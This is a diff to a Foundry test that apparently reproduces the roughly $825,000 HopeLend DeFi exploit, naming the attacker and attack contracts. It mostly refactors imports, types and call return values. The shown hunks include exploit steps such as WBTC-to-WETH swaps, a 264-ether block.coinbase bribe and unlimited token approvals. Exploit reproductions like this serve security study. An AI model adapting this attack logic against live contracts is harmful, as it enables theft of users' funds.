@@ -1,5 +1,14 @@
 import "forge-std/Test.sol";
 
+pragma solidity ^0.8.10;
+
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV3Router} from "src/interfaces/IUniswapV3Router.sol";
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+import {IWETH} from "src/interfaces/IWETH.sol";
 // @KeyInfo - Total Lost : ~$825000 US$
 // Attacker : https://etherscan.io/address/0xA8Bbb3742f299B183190a9B079f1C0db8924145b
 // Attack Contract : https://etherscan.io/address/0xc74b72bbf904bac9fac880303922fc76a69f0bb4
@@ -36,7 +45,7 @@ interface IHopeLendPool {
 contract ContractTest is Test {
 
     IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
-    IERC20 private WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH private WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 private USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 private HOPE = IERC20(0xc353Bf07405304AeaB75F4C2Fac7E88D6A68f98e);
@@ -51,7 +60,7 @@ contract ContractTest is Test {
 
     IUniswapV2Router UniRouter02 = IUniswapV2Router(payable(0x219Bd2d1449F3813c01204EE455D11B41D5051e9));
 
-    IUniswapV3Router Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV3Router Router = IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
 
     uint256 index = 0;
 
@@ -96,7 +105,7 @@ contract ContractTest is Test {
 
         WBTCToWETH();
         WETH.withdraw(WETH.balanceOf(address(this)));
-        block.coinbase.call{value: 264 ether}("");
+        (bool success4,) = block.coinbase.call{value: 264 ether}("");
 
         emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, WETH.decimals());
     }
@@ -162,7 +171,8 @@ contract ContractTest is Test {
     }
 
     function USDTToUSDC() internal {
-        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Router), type(uint256).max));
+        (bool success5,) =
+            address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Router), type(uint256).max));
         IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDT),
             tokenOut: address(USDC),
